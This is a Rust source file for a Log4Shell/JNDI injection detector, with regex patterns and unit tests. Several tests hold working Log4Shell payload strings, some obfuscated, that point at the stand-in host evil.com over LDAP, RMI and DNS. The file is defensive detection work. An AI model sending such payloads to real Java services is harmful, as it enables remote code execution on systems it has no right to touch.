// Copyright (c) 2026 erik <erik@erik.xyz> — https://erik.xyz

use crate::{AttackCategory, DetectionResult, Detector, Severity};
use regex::Regex;
use std::sync::LazyLock;

static PATTERNS: LazyLock<Vec<Regex>> = LazyLock::new(|| {
    vec![
        Regex::new(r"(?i)\$\{jndi:").unwrap(),
        Regex::new(r"(?i)\$\{lower:j\}").unwrap(),
        Regex::new(r"(?i)\$\{upper:j\}").unwrap(),
        Regex::new(r"(?i)\$\{::-j\}").unwrap(),
        Regex::new(r"(?i)\$\{env:").unwrap(),
        Regex::new(r"(?i)\$\{sys:").unwrap(),
        Regex::new(r"(?i)\$\{java:").unwrap(),
    ]
});

pub struct JndiInjectionDetector;

impl Detector for JndiInjectionDetector {
    fn name(&self) -> &'static str {
        "jndi_injection"
    }

    fn detect(&self, input: &str) -> Option<DetectionResult> {
        for re in PATTERNS.iter() {
            if let Some(m) = re.find(input) {
                return Some(DetectionResult {
                    attack_type: "jndi_injection".into(),
                    category: AttackCategory::Injection,
                    severity: Severity::Critical,
                    matched_pattern: m.as_str().to_string(),
                    offset: m.start(),
                    message: "JNDI/Log4Shell injection detected".into(),
                });
            }
        }
        None
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn det() -> JndiInjectionDetector {
        JndiInjectionDetector
    }

    fn assert_hit(input: &str) {
        let r = det()
            .detect(input)
            .expect("expected JNDI injection detection");
        assert_eq!(r.attack_type, "jndi_injection");
        assert_eq!(r.category, AttackCategory::Injection);
        assert_eq!(r.severity, Severity::Critical);
        assert!(!r.matched_pattern.is_empty(), "matched_pattern empty");
        assert!(
            r.offset <= input.len(),
            "offset {} > len {}",
            r.offset,
            input.len()
        );
    }

    #[test]
    fn name_is_jndi_injection() {
        assert_eq!(det().name(), "jndi_injection");
    }

    #[test]
    fn detects_common_payloads() {
        for input in [
            "${jndi:ldap://evil.com/a}",
            "${lower:j}ndi:ldap://evil.com/a}",
            "${upper:j}NDI:rmi://evil.com}",
            "${::-j}ndi:dns://evil.com}",
            "${env:JNDI_LOOKUP}",
            "${sys:java.version}",
            "${java:os.name}",
        ] {
            assert_hit(input);
        }
    }

    #[test]
    fn benign_inputs_not_detected() {
        for input in [
            "Hello, this is a normal text input. Nothing suspicious here.",
            "The jndi lookup service is running",
            "Please set the JAVA_HOME env variable",
            "log4j is a logging library",
        ] {
            assert!(det().detect(input).is_none(), "false positive: {input}");
        }
    }

    #[test]
    fn edge_cases() {
        assert!(det().detect("").is_none());
        assert!(det().detect(" \t\n ").is_none());
        assert!(det().detect("你好世界 こんにちは").is_none());
        // near misses: missing ${ prefix or missing colon
        assert!(det().detect("jndi:ldap://evil.com/a").is_none());
        assert!(det().detect("${jndi").is_none());
        assert!(det().detect("${jndildap://evil.com}").is_none());
    }

    #[test]
    fn obfuscated_variants_detected() {
        for input in [
            "${JNDI:ldap://evil.com/a}",
            "${LoWeR:j}ndi:ldap://evil.com}",
            "${ENV:LOG4J_FORMAT_MSG_NO_LOOKUPS}",
        ] {
            assert_hit(input);
        }
    }
}
